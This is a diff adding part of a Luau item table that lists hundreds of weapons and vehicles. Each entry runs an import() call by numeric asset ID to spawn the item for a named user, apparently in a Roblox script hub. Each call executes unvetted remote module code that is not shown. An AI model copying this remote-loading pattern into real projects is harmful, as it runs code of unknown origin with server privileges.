+			Name = "Bushmaster ACR",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Bushmaster ACR") end
+		},
+		{
+			Name = "C7A2",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "C7A2") end
+		},
+		{
+			Name = "C8A3",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "C8A3") end
+		},
+		{
+			Name = "Colt M1911",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Colt M1911") end
+		},
+		{
+			Name = "Colt SAA Revolver",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Colt SAA Revolver") end
+		},
+		{
+			Name = "DVLP SOPMOD AK",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "DVLP SOPMOD AK") end
+		},
+		{
+			Name = "Deagle L5",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Deagle L5") end
+		},
+		{
+			Name = "Desert Barrett M82",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Desert Barrett M82") end
+		},
+		{
+			Name = "Dragunov SVDS",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Dragunov SVDS") end
+		},
+		{
+			Name = "Early Type 14 Nambu",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Early Type 14 Nambu") end
+		},
+		{
+			Name = "FAMAS",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "FAMAS") end
+		},
+		{
+			Name = "FAMAS Scope",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "FAMAS Scope") end
+		},
+		{
+			Name = "FN FAL",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "FN FAL") end
+		},
+		{
+			Name = "FN FAL 50.63",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "FN FAL 50.63") end
+		},
+		{
+			Name = "FP-45",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "FP-45") end
+		},
+		{
+			Name = "Fallout 3 Reservist's Rifle",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Fallout 3 Reservist's Rifle") end
+		},
+		{
+			Name = "Fergo HBR-A309 Astork",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Fergo HBR-A309 Astork") end
+		},
+		{
+			Name = "FiveSeven",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "FiveSeven") end
+		},
+		{
+			Name = "G3",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "G3") end
+		},
+		{
+			Name = "MA5B",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MA5B") end
+		},
+		{
+			Name = "G36C",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "G36C") end
+		},
+		{
+			Name = "G36K",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "G36K") end
+		},
+		{
+			Name = "GROZA-1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "GROZA-1") end
+		},
+		{
+			Name = "Galil",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Galil") end
+		},
+		{
+			Name = "Raygun Mark II",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Raygun Mark II") end
+		},
+		{
+			Name = "Glock 17-S",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Glock 17-S") end
+		},
+		{
+			Name = "Glock 18",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Glock 18") end
+		},
+		{
+			Name = "Glock 19",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Glock 19") end
+		},
+		{
+			Name = "Green Barrett M82",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Green Barrett M82") end
+		},
+		{
+			Name = "H&K MP5",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "H&K MP5") end
+		},
+		{
+			Name = "HK MP5",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK MP5") end
+		},
+		{
+			Name = "HK MP5/10",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK MP5/10") end
+		},
+		{
+			Name = "HK MP5K",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK MP5K") end
+		},
+		{
+			Name = "HK MP5SD",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK MP5SD") end
+		},
+		{
+			Name = "HK SL8",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK SL8") end
+		},
+		{
+			Name = "HK416 Comp aimpoint",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK416 Comp aimpoint") end
+		},
+		{
+			Name = "HK416A5",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK416A5") end
+		},
+		{
+			Name = "HK417",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK417") end
+		},
+		{
+			Name = "Henry Pony",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Henry Pony") end
+		},
+		{
+			Name = "Hk416",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Hk416") end
+		},
+		{
+			Name = "IWI Tavor",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "IWI Tavor") end
+		},
+		{
+			Name = "Ithaca M37 Stakeout",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Ithaca M37 Stakeout") end
+		},
+		{
+			Name = "KAC SR-16",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "KAC SR-16") end
+		},
+		{
+			Name = "KSG 12",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "KSG 12") end
+		},
+		{
+			Name = "La_Shotgun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "La_Shotgun") end
+		},
+		{
+			Name = "Luger",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Luger") end
+		},
+		{
+			Name = "Luger P08",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Luger P08") end
+		},
+		{
+			Name = "Lynx CQ300",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Lynx CQ300") end
+		},
+		{
+			Name = "M1 Garand",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M1 Garand") end
+		},
+		{
+			Name = "M134",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M134") end
+		},
+		{
+			Name = "M134-A2",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M134-A2") end
+		},
+		{
+			Name = "M14 DMR",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M14 DMR") end
+		},
+		{
+			Name = "M16",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M16") end
+		},
+		{
+			Name = "M16 M203",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M16 M203") end
+		},
+		{
+			Name = "M16A1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M16A1") end
+		},
+		{
+			Name = "M16A1G",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M16A1G") end
+		},
+		{
+			Name = "M16A2",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M16A2") end
+		},
+		{
+			Name = "M16A2/M203",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M16A2/M203") end
+		},
+		{
+			Name = "M16A4",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M16A4") end
+		},
+		{
+			Name = "M1897 Trench Gun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M1897 Trench Gun") end
+		},
+		{
+			Name = "M1911A1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M1911A1") end
+		},
+		{
+			Name = "M1921",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M1921") end
+		},
+		{
+			Name = "M1928A1 Thompson",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M1928A1 Thompson") end
+		},
+		{
+			Name = "M200",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M200") end
+		},
+		{
+			Name = "M240B",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M240B") end
+		},
+		{
+			Name = "M249",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M249") end
+		},
+		{
+			Name = "M26",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M26") end
+		},
+		{
+			Name = "M3 Grease Gun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M3 Grease Gun") end
+		},
+		{
+			Name = "M320",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M320") end
+		},
+		{
+			Name = "Lightning Cannon",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Lightning Cannon") end
+		},
+		{
+			Name = "M4 + GL",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4 + GL") end
+		},
+		{
+			Name = "M4 Carbine M552",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4 Carbine M552") end
+		},
+		{
+			Name = "Gaster Blaster",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Gaster Blaster") end
+		},
+		{
+			Name = "M4 Carbine TA31RCO",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4 Carbine TA31RCO") end
+		},
+		{
+			Name = "M4 RAS",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4 RAS") end
+		},
+		{
+			Name = "M4 SOPMOD",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4 SOPMOD") end
+		},
+		{
+			Name = "M4 [Acog]",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4 [Acog]") end
+		},
+		{
+			Name = "M40A5",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M40A5") end
+		},
+		{
+			Name = "M416",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M416") end
+		},
+		{
+			Name = "Fallout 4 Gatling laser",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Fallout 4 Gatling laser") end
+		},
+		{
+			Name = "M4A1 Block II EXPS2",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4A1 Block II EXPS2") end
+		},
+		{
+			Name = "M4A1 Block II TA31RCO",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4A1 Block II TA31RCO") end
+		},
+		{
+			Name = "M4A1/Grip/Acog",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4A1/Grip/Acog") end
+		},
+		{
+			Name = "M4SD AimPoint V2",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4SD AimPoint V2") end
+		},
+		{
+			Name = "M60 Green",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M60 Green") end
+		},
+		{
+			Name = "M60 Grey",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M60 Grey") end
+		},
+		{
+			Name = "M60 Pink",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M60 Pink") end
+		},
+		{
+			Name = "M61",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M61") end
+		},
+		{
+			Name = "M72-LAW",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M72-LAW") end
+		},
+		{
+			Name = "M9",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M9") end
+		},
+		{
+			Name = "M9-S",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M9-S") end
+		},
+		{
+			Name = "M93R",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M93R") end
+		},
+		{
+			Name = "M98B Scoped",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M98B Scoped") end
+		},
+		{
+			Name = "MAC-10",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MAC-10") end
+		},
+		{
+			Name = "MAC-11 {S}",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MAC-11 {S}") end
+		},
+		{
+			Name = "MG34",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MG34") end
+		},
+		{
+			Name = "MG36",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MG36") end
+		},
+		{
+			Name = "MK11",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MK11") end
+		},
+		{
+			Name = "MK14 EBR",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MK14 EBR") end
+		},
+		{
+			Name = "MP40",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP40") end
+		},
+		{
+			Name = "MP43E",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP43E") end
+		},
+		{
+			Name = "MP44",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP44") end
+		},
+		{
+			Name = "MP5A3",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP5A3") end
+		},
+		{
+			Name = "MP5SD",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP5SD") end
+		},
+		{
+			Name = "MP7",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP7") end
+		},
+		{
+			Name = "MP7 Scoped",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP7 Scoped") end
+		},
+		{
+			Name = "MP7 {S}",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP7 {S}") end
+		},
+		{
+			Name = "MP7A1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP7A1") end
+		},
+		{
+			Name = "MP7A1 {S}",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP7A1 {S}") end
+		},
+		{
+			Name = "MR-153",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MR-153") end
+		},
+		{
+			Name = "MTAR-21",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MTAR-21") end
+		},
+		{
+			Name = "Mauser C96",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Mauser C96") end
+		},
+		{
+			Name = "Maverick 88",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Maverick 88") end
+		},
+		{
+			Name = "Micro Uzi",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Micro Uzi") end
+		},
+		{
+			Name = "Mk 16",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Mk 16") end
+		},
+		{
+			Name = "NDM-86",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "NDM-86") end
+		},
+		{
+			Name = "NV4",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "NV4") end
+		},
+		{
+			Name = "NV4 Scoped",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "NV4 Scoped") end
+		},
+		{
+			Name = "Nine Seven Pistol",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Nine Seven Pistol") end
+		},
+		{
+			Name = "P90",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "P90") end
+		},
+		{
+			Name = "P90 Scoped",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "P90 Scoped") end
+		},
+		{
+			Name = "PKM",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "PKM") end
+		},
+		{
+			Name = "PP-19 Bizon",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "PP-19 Bizon") end
+		},
+		{
+			Name = "PPSH-41",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "PPSH-41") end
+		},
+		{
+			Name = "QBZ-95-1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "QBZ-95-1") end
+		},
+		{
+			Name = "R700",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "R700") end
+		},
+		{
+			Name = "Creagle",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Creagle") end
+		},
+		{
+			Name = "RPK",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "RPK") end
+		},
+		{
+			Name = "RPK",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "RPK") end
+		},
+		{
+			Name = "RPK-74",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "RPK-74") end
+		},
+		{
+			Name = "Railgun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Railgun") end
+		},
+		{
+			Name = "Remington",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Remington") end
+		},
+		{
+			Name = "Remington 870",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Remington 870") end
+		},
+		{
+			Name = "Remington New Model Army",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Remington New Model Army") end
+		},
+		{
+			Name = "Revolver",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Revolver") end
+		},
+		{
+			Name = "SCAR HAMR",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SCAR HAMR") end
+		},
+		{
+			Name = "SCAR PDW",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SCAR PDW") end
+		},
+		{
+			Name = "SCAR SV",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SCAR SV") end
+		},
+		{
+			Name = "SCAR-H",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SCAR-H") end
+		},
+		{
+			Name = "SCAR-H CQB",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SCAR-H CQB") end
+		},
+		{
+			Name = "SCAR-L",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SCAR-L") end
+		},
+		{
+			Name = "SIG MPX",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SIG MPX") end
+		},
+		{
+			Name = "SIG Sauer MPX",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SIG Sauer MPX") end
+		},
+		{
+			Name = "SKS",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SKS") end
+		},
+		{
+			Name = "SPAS 12",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SPAS 12") end
+		},
+		{
+			Name = "SR338",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SR338") end
+		},
+		{
+			Name = "SRM 1216",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SRM 1216") end
+		},
+		{
+			Name = "STG 77 A1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "STG 77 A1") end
+		},
+		{
+			Name = "SW40",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SW40") end
+		},
+		{
+			Name = "Sasha",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Sasha") end
+		},
+		{
+			Name = "Savage 220",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Savage 220") end
+		},
+		{
+			Name = "TAR-21",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "TAR-21") end
+		},
+		{
+			Name = "Thompson",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Thompson") end
+		},
+		{
+			Name = "Thumper",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Thumper") end
+		},
+		{
+			Name = "Trench Shotgun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Trench Shotgun") end
+		},
+		{
+			Name = "UMP-45",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "UMP-45") end
+		},
+		{
+			Name = "UMP-45 {S}",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "UMP-45 {S}") end
+		},
+		{
+			Name = "UMP-9 Tactical",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "UMP-9 Tactical") end
+		},
+		{
+			Name = "USAS-12",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "USAS-12") end
+		},
+		{
+			Name = "USP",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "USP") end
+		},
+		{
+			Name = "USP-S",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "USP-S") end
+		},
+		{
+			Name = "UZI",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "UZI") end
+		},
+		{
+			Name = "Urban Barrett M82",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Urban Barrett M82") end
+		},
+		{
+			Name = "VZ-61",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "VZ-61") end
+		},
+		{
+			Name = "Vector",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Vector") end
+		},
+		{
+			Name = "Vector /Scoped/ Suppressor/",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Vector /Scoped/ Suppressor/") end
+		},
+		{
+			Name = "Webley Mk IV",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Webley Mk IV") end
+		},
+		{
+			Name = "XM1014",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "XM1014") end
+		},
+		{
+			Name = "XM177E2",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "XM177E2") end
+		},
+		{
+			Name = "AR-15",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AR-15") end
+		},
+		{
+			Name = "Gustav",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Gustav") end
+		},
+		{
+			Name = "STF-12",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "STF-12") end
+		},
+		{
+			Name = "RPG-7 ",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "RPG-7 ") end
+		},
+		{
+			Name = "Grenade launcher",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Grenade launcher") end
+		},
+		{
+			Name = "M1911",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M1911") end
+		},
+		{
+			Name = "M4A1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4A1") end
+		},
+		{
+			Name = "MP5K",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP5K") end
+		},
+		{
+			Name = "Pump Shotgun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Pump Shotgun") end
+		},
+		{
+			Name = "M4",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4") end
+		},
+		{
+			Name = "AK74 PSO-1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK74 PSO-1") end
+		},
+		{
+			Name = "Beretta M92FS",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Beretta M92FS") end
+		},
+		{
+			Name = "Field Dressing 00]",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Field Dressing 00]") end
+		},
+		{
+			Name = "Frag Grenade",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Frag Grenade") end
+		},
+		{
+			Name = "G36",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "G36") end
+		},
+		{
+			Name = "Glock 17",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Glock 17") end
+		},
+		{
+			Name = "HK416A5S",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK416A5S") end
+		},
+		{
+			Name = "M4 Carbine M68",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M4 Carbine M68") end
+		},
+		{
+			Name = "MP412",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP412") end
+		},
+		{
+			Name = "PKM",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "PKM") end
+		},
+		{
+			Name = "AK47",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK47") end
+		},
+		{
+			Name = " Paintball Gun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, " Paintball Gun") end
+		},
+		{
+			Name = ".357",
+			Function = function(Username: string) import(12246306459).GetGun(Username, ".357") end
+		},
+		{
+			Name = "AK12",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK12") end
+		},
+		{
+			Name = "AM4-S",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AM4-S") end
+		},
+		{
+			Name = "Assault Rifle",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Assault Rifle") end
+		},
+		{
+			Name = "Desert Eagle",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Desert Eagle") end
+		},
+		{
+			Name = "Double-Barrel Shotgun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Double-Barrel Shotgun") end
+		},
+		{
+			Name = "HK416",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK416") end
+		},
+		{
+			Name = "HK416-D  V2(Coyote Sight",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "HK416-D  V2(Coyote Sight") end
+		},
+		{
+			Name = "M249 SAW",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M249 SAW") end
+		},
+		{
+			Name = "M3A1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "M3A1") end
+		},
+		{
+			Name = "MP5",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "MP5") end
+		},
+		{
+			Name = "PPSH 41",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "PPSH 41") end
+		},
+		{
+			Name = "Pistol",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Pistol") end
+		},
+		{
+			Name = "SMG",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "SMG") end
+		},
+		{
+			Name = "STG44",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "STG44") end
+		},
+		{
+			Name = "Shotgun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Shotgun") end
+		},
+		{
+			Name = "Shotgun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Shotgun") end
+		},
+		{
+			Name = "Tommy Gun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Tommy Gun") end
+		},
+		{
+			Name = "VSS VINTOREZ",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "VSS VINTOREZ") end
+		},
+		{
+			Name = "raigun",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "raigun") end
+		}
+	},
+
+	Vehicles = {
+		{
+			Name = "Rammable Car",
+			Function = function(Username: string) import(17747788054).car(Username) end
+		},
+		{
+			Name = "Tank",
+			Function = function(Username: string) import(17847930736).tank(Username) end
+		},
+		{
+			Name = "Flak Cannon",
+			Function = function(Username: string) import(6554368638).load(Username) end
+		},
+		{
+			Name = "USS Arleigh Burke",
+			Function = function(Username: string) 
+				import(18678780845).SSARLEIGHBURKE(Username)
+				import(18678753273).missile(Username)
+			end
+		},
+		{
+			Name = "AH1Z",
+			Function = function(Username: string) import(15396312233).AH1Z(Username) end
+		},
+		{
+			Name = "Tiger 2",
+			Function = function(Username: string) import(15398611506).TigerII(Username) end
+		},
+		{
+			Name = "M1A2 Abrams",
+			Function = function(Username: string) import(15398931187).M1A2(Username) end
+		},
+		{
+			Name = "Panther G",
+			Function = function(Username: string) import(14853575177).PANTHER_G(Username) end
+		},
+		{
+			Name = "RS6",
+			Function = function(Username: string) import(14843527426).RS6(Username) end
+		},
+		{
+			Name = "BMP2",
+			Function = function(Username: string) import(18128578585).BMP2(Username) end
+		},
+		{
+			Name = "Maus",
+			Function = function(Username: string) import(18645323256).Maus(Username) end
+		},
+		{
+			Name = "USS Nimitz",
+			Function = function(Username: string) import(18678802692).USSNIMITZ(Username) end
+		},
+		{
+			Name = "M1A2 Abrams Shed",
+			Function = function(Username: string) import(18144970909).RAroblox(Username) end
+		},
+		{
+			Name = "MBT Tank",
+			Function = function(Username: string) import(6589756311).tank(Username) end
+		},
+		{
+			Name = "Rocketship",
+			Function = function(Username: string) import(4911813426).load(Username) end
+		},
+		{
+			Name = "AC47",
+			Function = function(Username: string) import(6589773874).load(Username) end
+		},
+		{
+			Name = "ARC 170",
+			Function = function(Username: string) import(6589771252).load(Username) end
+		},
+		{
+			Name = "Air Force One",
+			Function = function(Username: string) import(6589764271).load(Username) end
+		},
+		{
+			Name = "B-2",
+			Function = function(Username: string) import(6589758872).load(Username) end
+		},
+		{
+			Name = "Delta 7",
+			Function = function(Username: string) import(6589776082).load(Username) end
+		},
+		{
+			Name = "F-15 E",
+			Function = function(Username: string) import(6539699936).load(Username) end
+		},
+		{
+			Name = "F-15E BA",
+			Function = function(Username: string) import(6589780305).load(Username) end
+		},
+		{
+			Name = "F/A 18 UPDATED",
+			Function = function(Username: string) import(6589829200).load(Username) end
+		},
+		{
+			Name = "F/A 18D",
+			Function = function(Username: string) import(6589844048).load(Username) end
+		},
+		{
+			Name = "F4 Phantom",
+			Function = function(Username: string) import(6589847328).load(Username) end
+		},
+		{
+			Name = "Turrent",
+			Function = function(Username: string) import(9113686175).load(Username) end
+		},
+		{
+			Name = "Chevrolet Racista",
+			Function = function(Username: string) import(10572586435).load(Username) end
+		},
+		{
+			Name = "Car",
+			Function = function(Username: string) import(5114246939).load(Username) end
+		},
+		{
+			Name = "Tonk",
+			Function = function(Username: string) import(5216663162).load(Username) end
+		},
+		{
+			Name = "Mini Excavator",
+			Function = function(Username: string) import(11102724246).load(Username) end
+		},
+		{
+			Name = "Excavator",
+			Function = function(Username: string) import(16999802471)(Username) end
+		},
+		{
+			Name = "Skyline R34 GTR Nismo",
+			Function = function(Username: string) import(6932842058).load(Username) end
+		},
+		{
+			Name = "2006 Mitsubishi Lancer Evo IX",
+			Function = function(Username: string) import(6937608494).load(Username) end
+		},
+		{
+			Name = "2008 Honda S2000",
+			Function = function(Username: string) import(6937611225).load(Username) end
+		},
+		{
+			Name = "2016 Ford Transit Van",
+			Function = function(Username: string) import(6937616939).load(Username) end
+		},
+		{
+			Name = "2016 Mercedes C63 AMG",
+			Function = function(Username: string) import(6937620939).load(Username) end
+		},
+		{
+			Name = "Bugatti Chiron",
+			Function = function(Username: string) import(6937628900).load(Username) end
+		},
+		{
+			Name = "Lotus F1 Car",
+			Function = function(Username: string) import(6937695835).load(Username) end
+		},
+		{
+			Name = "Rolls Royce Convertible",
+			Function = function(Username: string) import(6938304561).load(Username) end
+		},
+		{
+			Name = "Rolls Royce Phantom",
+			Function = function(Username: string) import(6938306647).load(Username) end
+		},
+		{
+			Name = "Volkswagen Golf V R32",
+			Function = function(Username: string) import(6938339422).load(Username) end
+		},
+		{
+			Name = "Honda Integra Type R",
+			Function = function(Username: string) import(6938343141).load(Username) end
+		},
+		{
+			Name = "2013 Mercedes-Benz SLS AMG C197",
+			Function = function(Username: string) import(6938347149).load(Username) end
+		},
+		{
+			Name = "Mazda Rx7",
+			Function = function(Username: string) import(6938350569).load(Username) end
+		},
+		{
+			Name = "Black Supra Widebody",
+			Function = function(Username: string) import(6938353184).load(Username) end
+		},
+		{
+			Name = "Toyota AE86 Anime Wrap",
+			Function = function(Username: string) import(6939742763).load(Username) end
+		},
+		{
+			Name = "Toyota AE86 Drift",
+			Function = function(Username: string) import(6939750076).load(Username) end
+		},
+		{
+			Name = "1986 Audi Sport Quattro S1 Rally Car",
+			Function = function(Username: string) import(6940125471).load(Username) end
+		},
+		{
+			Name = "2013 Ford Focus ST Rally Car",
+			Function = function(Username: string) import(6940128966).load(Username) end
+		},
+		{
+			Name = "1992 Honda NSX Type R",
